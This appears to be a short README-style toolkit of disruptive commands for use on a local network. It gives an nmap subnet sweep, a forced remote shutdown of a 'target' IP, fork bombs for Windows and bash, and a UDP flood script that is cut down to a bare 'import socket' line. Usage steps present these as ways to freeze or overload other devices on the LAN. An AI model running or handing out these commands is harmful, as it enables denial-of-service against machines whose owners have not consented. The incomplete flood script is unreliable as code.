## 1. Scan LAN (Kali Linux/macOS)
nmap -sn 192.168.1.0/24
- Scans the subnet (192.168.1.0/24) to find all devices connected to the network.

## 2. Shutdown Target (Windows)
shutdown /s /f /t 0 /m \\192.168.1.5
- Shuts down the target machine with IP `192.168.1.5` immediately.

## 3. Fork Bomb (Windows)
%0|%0
- Creates an infinite loop, which consumes system resources and causes the computer to freeze.

## 4. Fork Bomb (Linux/macOS)
:(){ :|:& };:
- A fork bomb in bash that overloads system processes, causing the computer to freeze.

## 5. UDP Flood (Python)
import socket
- Python script that sends a massive number of UDP packets to the target machine, potentially overloading it.

## How to Use:
- For Kali: Open a terminal and run `bash scan_lan.sh` to discover devices on your local network.
- For Windows: Execute `shutdown_target.cmd` or `freeze.bat` to freeze the target system (on the same LAN).
- For Linux/macOS: Run `bash forkbomb.sh` to trigger a freeze, or use the UDP flood Python script to overload a device.
